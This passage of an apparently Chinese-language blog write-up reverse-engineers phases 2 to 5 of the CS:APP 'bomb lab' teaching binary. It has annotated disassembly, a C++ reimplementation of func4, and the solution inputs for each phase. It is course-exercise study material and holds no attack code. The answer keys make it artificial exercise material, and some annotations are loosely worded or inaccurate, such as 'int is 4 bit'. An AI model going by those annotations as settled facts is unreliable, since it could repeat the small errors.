&lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）</span><br><span class="line"></span><br><span class="line">401388:	ba 00 00 00 00       	mov    $0x0,%edx      ; 将 0 移动到 %edx（表示字符串相等）</span><br><span class="line">40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）</span><br><span class="line"></span><br><span class="line">40138f:	ba 01 00 00 00       	mov    $0x1,%edx      ; 将 1 移动到 %edx（表示字符串不相等）</span><br><span class="line">401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）</span><br><span class="line"></span><br><span class="line">401396:	ba 01 00 00 00       	mov    $0x1,%edx      ; 将 1 移动到 %edx（表示字符串不相等）</span><br><span class="line">40139b:	89 d0                	mov    %edx,%eax      ; 将 %edx 的值移动到 %eax（结果）</span><br><span class="line">40139d:	5b                   	pop    %rbx           ; 从堆栈中弹出 %rbx</span><br><span class="line">40139e:	5d                   	pop    %rbp           ; 从堆栈中弹出 %rbp</span><br><span class="line">40139f:	41 5c                	pop    %r12           ; 从堆栈中弹出 %r12</span><br><span class="line">4013a1:	c3                   	retq                  ; 从函数中返回</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400efc &lt;+0&gt;:     push   %rbp             ; 将 %rbp 寄存器的值推送到栈上</span><br><span class="line">0x0000000000400efd &lt;+1&gt;:     push   %rbx             ; 将 %rbx 寄存器的值推送到栈上</span><br><span class="line">0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp       ; 在栈上分配 0x28（40）字节的空间</span><br><span class="line">0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi         ; 将栈顶地址（%rsp）的值传递给 %rsi 寄存器</span><br><span class="line">0x0000000000400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;  ; 调用 read_six_numbers 函数</span><br><span class="line">0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)      ; 比较栈上第一个元素的值与 1 是否相等</span><br><span class="line">0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;  ; 如果相等，跳转到 0x400f30 处</span><br><span class="line">0x0000000000400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;  ; 否则调用 explode_bomb 函数</span><br><span class="line">0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;  ; 跳转到 0x400f30 处</span><br><span class="line"></span><br><span class="line">0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax   ; 将 %rbx 寄存器指向的地址减 4的值 加载到 %eax,第二个参数,发现是加一倍</span><br><span class="line">0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax         ; 将 %eax 寄存器的值加倍</span><br><span class="line">0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)      ; 比较 %eax 和 %rbx 寄存器指向的地址处的值</span><br><span class="line">0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;  ; 如果相等，跳转到 0x400f25 处</span><br><span class="line">0x0000000000400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;  ; 否则调用 explode_bomb 函数</span><br><span class="line">0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx        ; 将 %rbx 寄存器的值增加 4</span><br><span class="line">0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx        ; 比较 %rbp 和 %rbx 寄存器的值,比较是否是第六个数</span><br><span class="line">0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;  ; 如果不相等，跳转到 0x400f17 处</span><br><span class="line">0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;  ; 否则跳转到 0x400f3c 处,</span><br><span class="line"></span><br><span class="line">0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx  ; 计算栈上地址 %rsp + 4，并将结果存储到 %rbx 寄存器</span><br><span class="line">0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp ; 计算栈上地址 %rsp + 0x18（24），并将结果存储到 %rbp 寄存器</span><br><span class="line">0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;  ; 跳转到 0x400f17 处</span><br><span class="line">0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp       ; 在栈上释放 0x28（40）字节的空间</span><br><span class="line">0x0000000000400f40 &lt;+68&gt;:    pop    %rbx             ; 弹出栈顶的 %rbx 寄存器的值</span><br><span class="line">0x0000000000400f41 &lt;+69&gt;:    pop    %rbp             ; 弹出栈顶的 %rbp 寄存器的值</span><br><span class="line">0x0000000000400f42 &lt;+70&gt;:    retq                    ; 从函数中返回</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是一个简单的倍增循环,需要知道stack的概念.</p>
<p>一开始能够简单的确定stack上的第一个元素与1是相等的</p>
<p>然后把第二个元素的地址加载到rbx上,因为里面存的是int,int是4个bit,所以每次加四,然后把前一个值加倍看他是否与当前值相等.</p>
<p>故六次循环后我们会发现每次循环能不断推断出第一个,第二个,直到第六个元素,为倍增关系</p>
<p>故答案: 1 2 4 8 16 32</p>
<p>代码混淆解释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rbx=rsp+4  //lea 0x4(%rsp),%rbx</span><br><span class="line">rbx=*(rsp+4) //mov 0x4(%rsp),%rbx</span><br></pre></td></tr></table></figure>

<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>人工打了跳转标记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     .L1</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  .L1</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     .L2</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  400f81:	eb 3b                	jmp    .L3</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  400f88:	eb 34                	jmp    .L3</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  400f8f:	eb 2d                	jmp    .L3</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  400f96:	eb 26                	jmp    .L3</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  400f9d:	eb 1f                	jmp    .L3</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  400fa4:	eb 18                	jmp    .L3</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  400fab:	eb 11                	jmp    .L3</span><br><span class="line">  .L2 </span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    .L3</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  .L3</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:	74 05                	je    .L4</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  .L4</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>gpt解读</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp          ; 为局部变量分配空间</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx     ; 将局部变量地址加载到寄存器 rcx 中</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx     ; 将局部变量地址加载到寄存器 rdx 中</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi      ; 将常量地址加载到寄存器 esi 中</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax          ; 清零寄存器 eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;  ; 调用 sscanf 函数，将输入解析为整数,</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax          ; 比较返回值与1</span><br><span class="line">  400f63:	7f 05                	jg     .L1                ; 如果大于1，跳转到.L1</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;  ; 否则，调用 explode_bomb 函数</span><br><span class="line">  .L1</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)    ; 比较第二个局部变量和7,0x8(%rsp)要小于7(无符号类型)</span><br><span class="line">  400f6f:	77 3c                	ja     .L2                ; 如果大于7，跳转到.L2</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax    ; 将第二个局部变量加载到寄存器 eax 中</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)  ; 通过跳转表间接调用不同的分支(%rax*8+*402470)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax        ; 第一种分支1:</span><br><span class="line">  400f81:	eb 3b                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax       ; 第二种分支:2</span><br><span class="line">  400f88:	eb 34                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax       ; 第三种分支.输入为3</span><br><span class="line">  400f8f:	eb 2d                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax       ; 第四种分支:4</span><br><span class="line">  400f96:	eb 26                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax        ; 第五种分支</span><br><span class="line">  400f9d:	eb 1f                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax       ; 第六种分支</span><br><span class="line">  400fa4:	eb 18                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax       ; 第七种分支</span><br><span class="line">  400fab:	eb 11                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  .L2 </span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;  ; 如果第二个局部变量大于7，调用 explode_bomb 函数</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax          ; 将返回值清零</span><br><span class="line">  400fb7:	eb 05                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax       ; 第八种分支</span><br><span class="line">  .L3</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax    ; 比较第三个局部变量和返回值 </span><br><span class="line">  400fc2:	74 05                	je    .L4                ; 如果相等，跳转到.L4</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;  ; 否则，调用 explode_bomb 函数</span><br><span class="line">  .L4</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp         ; 函数结束，恢复栈空间</span><br><span class="line">  400fcd:	c3                   	retq                      ; 返回</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>_isoc99_sscanf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其转换了含有几个整数的字符串则返回值是几</span><br></pre></td></tr></table></figure>



<ul>
<li><code>0x0(%rsp)</code> 是栈顶位置，通常是函数的返回地址。</li>
<li><code>0x4(%rsp)</code> 是栈顶位置向下偏移4字节的位置，可能是一个局部变量或参数。</li>
</ul>
<p>在这么多条分支里面找到一条能成立的就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmpq   *0x402470(,%rax,8) </span><br></pre></td></tr></table></figure>

<p>这个函数是重点,这是跳转表间接实现switch操作,先确定输入的第一个变量在[0,7]之间,首先用gdb指令确定*0x402470的值,假定其会跳转到第一个分支,即令第一个变量等于0,刚好能跳转到第一个分支,那想要炸弹不爆炸只能%eax&#x3D;207,所以其中一种答案就算出来了</p>
<p>答案 0 207</p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  ;设第一个数字为a,第二个数字为b</span><br><span class="line">  0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">  0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">  0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">  0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">  0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">  0x0000000000401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;;读入</span><br><span class="line">  0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax;个数为2</span><br><span class="line">  0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">  0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp);比较a和0xe,a&lt;=0xe=14</span><br><span class="line">  0x0000000000401033 &lt;+39&gt;:    jbe    .L1</span><br><span class="line">  0x0000000000401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">.L1</span><br><span class="line"> 0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx;往里面塞两个值edx,esi更新;</span><br><span class="line">  0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi</span><br><span class="line">  0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi;edi=a</span><br><span class="line">  0x0000000000401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt;;调用func4</span><br><span class="line">  0x000000000040104d &lt;+65&gt;:    test   %eax,%eax;还要看eax是否为0,即返回值是否为0,结合后文,返回值要0</span><br><span class="line">  0x000000000040104f &lt;+67&gt;:    jne    .L2</span><br><span class="line">  0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp);故b=0</span><br><span class="line">  0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">  .L2</span><br><span class="line">  0x0000000000401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">  0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp</span><br><span class="line">  0x0000000000401061 &lt;+85&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>现在我们要确定数字a,b,已知b&#x3D;0,故要确定a的值</p>
<p>补充资料</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdi：第一个参数</span><br><span class="line">rsi：第二个参数</span><br><span class="line">rdx：第三个参数</span><br><span class="line">rcx：第四个参数</span><br><span class="line">r8：第五个参数</span><br><span class="line">r9：第六个参数</span><br></pre></td></tr></table></figure>

<p><func4>#目标是让rax即返回值是0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;rdi=a;edx=e;esi=0</span><br><span class="line">  .L3</span><br><span class="line">  0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">  # retval=rdx</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax  </span><br><span class="line">   #retval-=rsi</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx#右移31位==&gt;取符号位</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax</span><br><span class="line"></span><br><span class="line">   ---</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:    sar    %eax ;eax/=2;ret=ret&gt;&gt;1</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx;ecx=rax+rsi</span><br><span class="line">   </span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx;&lt;=</span><br><span class="line">   #if(ecx==edi)return 0</span><br><span class="line">   #if(ecx&lt;edi)func()</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:    jle    .L1</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   </span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax#倍增</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:    jmp    .L2</span><br><span class="line">  .L1</span><br><span class="line">  0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax;</span><br><span class="line">  </span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:    jge    .L2</span><br><span class="line">   #esi=rcx+1</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:    .L3;调回到开头,即为一次递归调用,观察其改变什么值就可以了</span><br><span class="line">   ;即返回值ret后要再倍增+1</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax;2*%rax+1</span><br><span class="line">   .L2</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>观察如何让rax&#x3D;0;</p>
<p>把它按行翻译为c++代码,然后跑一遍就好了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//int rdi=x,edx=a1,esi=a2,rcx=tmp</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a1,<span class="type">int</span> a2,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"><span class="comment">//ret=a1</span></span></span><br><span class="line"><span class="function"><span class="comment">//ret-=a2</span></span></span><br><span class="line"><span class="function"><span class="comment">//int tmp=ret</span></span></span><br><span class="line"><span class="function"><span class="comment">//tmp&gt;&gt;31</span></span></span><br><span class="line"><span class="function">tmp</span>=(a1-a2)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">ret=(a1-a2+tmp)&gt;&gt;<span class="number">1</span></span><br><span class="line">tmp=ret+a2</span><br><span class="line"><span class="keyword">if</span>(tmp==x)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp&lt;x)&#123;</span><br><span class="line">ret=<span class="built_in">func</span>(a1,tmp+<span class="number">1</span>,x)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*ret+<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tmp&gt;x)&#123;</span><br><span class="line"> ret=<span class="built_in">func</span>(a1<span class="number">-1</span>,a2,x)</span><br><span class="line"> <span class="keyword">return</span> <span class="number">2</span>*ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>测试代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int rdi=x,edx=a1,esi=a2,rcx=tmp</span></span><br><span class="line"><span class="comment">//rdi=x;edx=e;esi=0</span></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">func</span><span class="params">(<span class="type">int</span> a1,<span class="type">int</span> a2,<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="comment">//ret=a1</span></span><br><span class="line"><span class="comment">//ret-=a2</span></span><br><span class="line"><span class="comment">//int tmp=ret</span></span><br><span class="line"><span class="comment">//tmp&gt;&gt;31</span></span><br><span class="line"><span class="type">int</span> tmp=(a1-a2)&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="type">int</span> ret=(a1-a2+tmp)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">tmp=ret+a2;</span><br><span class="line"><span class="keyword">if</span>(tmp==x)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp&lt;x)&#123;</span><br><span class="line">ret=<span class="built_in">func</span>(a1,tmp+<span class="number">1</span>,x);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*ret+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tmp&gt;x)&#123;</span><br><span class="line"> ret=<span class="built_in">func</span>(a1<span class="number">-1</span>,a2,x);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">2</span>*ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="built_in">func</span>(<span class="number">14</span>,<span class="number">0</span>,i)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们就能够很清楚的知道四个数字:0 1 3 7</p>
<p>所以答案有四种: </p>
<ul>
<li>0 0</li>
<li>1 0</li>
<li>3 0:</li>
<li>7 0</li>
</ul>
<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:  !# %fs:0x28 -&gt; 3678849592732380416 这是一个保护堆栈的值</span><br><span class="line">  401062:   53                      push   %rbx</span><br><span class="line">  401063:   48 83 ec 20             sub    $0x20,%rsp   !# 开了32字节</span><br><span class="line">  401067:   48 89 fb                mov    %rdi,%rbx    !# rbx 也是string </span><br><span class="line">  40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:   00 00 </span><br><span class="line">  401073:   48 89 44 24 18          mov    %rax,0x18(%rsp) !# fs:0x28</span><br><span class="line">  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt; ;返回值是rax</span><br><span class="line">  40107f:   83 f8 06                cmp    $0x6,%eax       !# string_length 为6就去 4010d2 执行，否则爆炸</span><br><span class="line">  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">                                            !# 最初rax=0, 循环6次， 每次处理第 rax个字符</span><br><span class="line">  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx  !# ecx = *rbx + *rax = *rdi + *rax 即第rax个字符</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)          !# 栈顶 = cl                     即第rax个字符</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx         !# rdx = rsp = cl                即第rax个字符</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx           !# edx &amp;= 0xf, edx = cl 的低4位  即第rax个字符的低四位</span><br><span class="line">  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx !# 0x4024b0[*rdx] -&gt; edx</span><br><span class="line">  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1) !dl -&gt; 0x10 + *rsp + *rax</span><br><span class="line">  4010a4:   48 83 c0 01             add    $0x1,%rax             !# *rax ++</span><br><span class="line">  4010a8:   48 83 f8 06             cmp    $0x6,%rax             !# rax != 0x6  即循环六次</span><br><span class="line">  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line"></span><br><span class="line">  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi      !# &quot;flyers&quot;</span><br><span class="line">  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi     !# 0x10(%rsp) ~ 0x15(%rsp)  和 &quot;flyers&quot;相等就跳转即成功了 否则爆炸</span><br><span class="line">  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  </span><br><span class="line">  4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;;跳回40108b</span><br><span class="line"></span><br><span class="line">  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax  !# 如果相等就跳转则说明没有溢出</span><br><span class="line">  4010e5:   00 00 </span><br><span class="line">  4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:   5b                      pop    %rbx</span><br><span class="line">  4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>啥逼玩意能通过偏移量达到flyers,取末尾四位,在来一遍这个地址</p>
<p>把这两个地址的所含字符串输出出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    $0x40245e,%esi </span><br><span class="line"> movzbl 0x4024b0(%rdx),%edx</span><br></pre></td></tr></table></figure>

<p>能找到这两个字符串</p>
<p>问题串:adui<strong>ers</strong>n<strong>f</strong>otvby<strong>l</strong>So you think you can stop the bomb with ctrl-c, do you?</p>
<p>转换后的串:flyers</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx  !# ecx = *rbx + *rax = *rdi + *rax 即第rax个字符</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)          !# 栈顶 = cl                     即第rax个字符</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx         !# rdx = rsp = cl                即第rax个字符</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx           !# edx &amp;= 0xf, edx = cl 的低4位  即第rax个字符的低四位</span><br></pre></td></tr></table></figure>

<p>即每次取输入字符串的一个字符,取其低四位,以此为索引,在问题串中找对应偏移量的字符,存入stack中,循环六次后,和转换后的串一比较,相等即通过</p>
<p>偏移公式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movzbl 0x4024b0(%rdx),%edx;0x4024b0是问题串的首位置</span><br><span class="line"> mov    %dl,0x10(%rsp,%rax,1);把它存起来,rax会递增,所以每个字符会一个一个存起来</span><br></pre></td></tr></table></figure>

<p>然后对着ascII码表算一算</p>
<ol>
<li>9&gt;&gt;Y</li>
<li>15&gt;&gt;o</li>
<li>14&gt;&gt;n</li>
<li>5&gt;&gt;e</li>
<li>6&gt;&gt;f</li>
<li>7&gt;&gt;g</li>
</ol>
<p>答案Yonefg(其中一种)</p>
